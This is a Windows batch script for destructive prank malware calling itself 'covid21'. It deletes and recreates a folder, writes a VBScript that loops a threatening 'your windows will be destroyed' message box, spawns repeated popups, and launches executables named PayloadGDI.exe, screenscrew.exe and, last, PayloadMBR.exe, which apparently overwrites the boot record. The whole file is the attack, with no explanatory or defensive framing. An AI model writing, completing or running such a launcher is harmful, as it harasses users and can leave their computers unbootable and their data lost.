@echo off
rd c:\covid21 /s /q
md c:\covid21
copy covid.bmp c:\covid21
clwcp c:\covid21\covid.bmp
echo do > covid.vbs
echo msgbox "covid21 is here! your windows will be destroyed" >> covid.vbs
echo loop >> covid.vbs
start covid.vbs
timeout 5 /nobreak
start PayloadGDI.exe
timeout 5 /nobreak
start screenscrew.exe
timeout 1 /nobreak
echo msgbox "corona virus!" >corona.vbs
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 1 /nobreak
start corona.vbs
timeout 5 /nobreak
echo msgbox "your windows will die from covid21 corona virus" >covid21.vbs
start covid21.vbs
timeout 3 /nobreak
start PayloadMBR.exe
